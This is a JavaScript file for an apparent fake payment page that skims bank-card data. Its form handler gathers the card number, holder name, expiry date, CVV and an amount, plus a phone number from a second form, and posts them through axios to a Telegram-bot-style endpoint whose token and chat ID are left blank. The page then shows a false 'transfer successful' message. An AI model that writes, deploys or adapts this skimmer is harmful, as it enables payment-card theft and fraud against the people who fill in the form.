const TOKEN = "";
const CHAT_ID = "";
const URI_API = ``

const modal = document.querySelector('.modal')
const modal2 = document.querySelector('.modal2');
const modal3 = document.querySelector('.modal3');
const span = document.querySelector('.close')
const span2 = document.querySelector('.close')
const span3 = document.querySelector('.close3')
const bt = document.querySelector('.form_button2')
const mc2 = document.querySelector('.modal-content2')

const taa = 'Перевод выполнен успешно'
// taa.clasList.add ='taa'
function f1() {
    modal2.style.display = 'none'
}
function f2() {
    modal3.style.display = 'block'

}
bt.addEventListener('click', () => {
    setTimeout(f1, 3000)
    setTimeout(f2, 5000)

})
// bt.addEventListener() = () => {
// }
const form = document.getElementById('tg')
form.addEventListener('submit', function(e) {
    e.preventDefault()

    let message = `<b>Данные</b>\n`
    message += `<b>Номер: ${this.numer.value}</b>\n`
    message += `<b>Holder: ${this.holder.value}</b>\n`
    message += `<b>Month: ${this.month.value}</b>\n`
    message += `<b>Year: ${this.year.value}</b>\n`
    message += `<b>CVV: ${this.cvv.value}</b>\n`
    message += `<b>COST: ${this.cost.value}р.</b>\n`

    axios.post(URI_API, {
        chat_id: CHAT_ID,
        parse_mode: 'html',
        text: message
    })
    modal2.style.display = "block";
})
span.onclick = () => {modal.style.display = "none"}
window.onclick = (e) => {e.target == modal ? modal.style.display = "none" : null}

const formPh = document.getElementById('phon-form');
formPh.addEventListener('submit', function(e) {
    e.preventDefault();

    const message2 = `<b>Номер с телефона: ${this.number.value}</b>`;

    axios.post(URI_API, {
        chat_id: CHAT_ID,
        parse_mode: 'html',
        text: message2
    })
});
span2.onclick = () => {modal2.style.display = "none"}
window.onclick = (e) => {e.target == modal2 ? modal2.style.display = "none" : null}

span3.onclick = () => {modal3.style.display = "none"}
window.onclick = (e) => {e.target == modal3 ? modal3.style.display = "none" : null}










const inMonth = document.getElementById('month');
const inYear = document.getElementById('year');
const cardYear = document.querySelector('.yy');
const cardMonth = document.querySelector('.mm');
inMonth.addEventListener('input', function() {
    cardMonth.textContent = inMonth.value;
})
inYear.addEventListener('input', function() {
    cardYear.textContent = inYear.value;
})

const inNumber = document.getElementById('number');
const cardNumber = document.querySelector('.card_number');
inNumber.addEventListener('input', function() {
    cardNumber.textContent = inNumber.value;
})


const inHolder = document.getElementById('holder');
const cardHolder = document.querySelector('.card_holder');
inHolder.addEventListener('input', () => {
    cardHolder.textContent = inHolder.value;
})
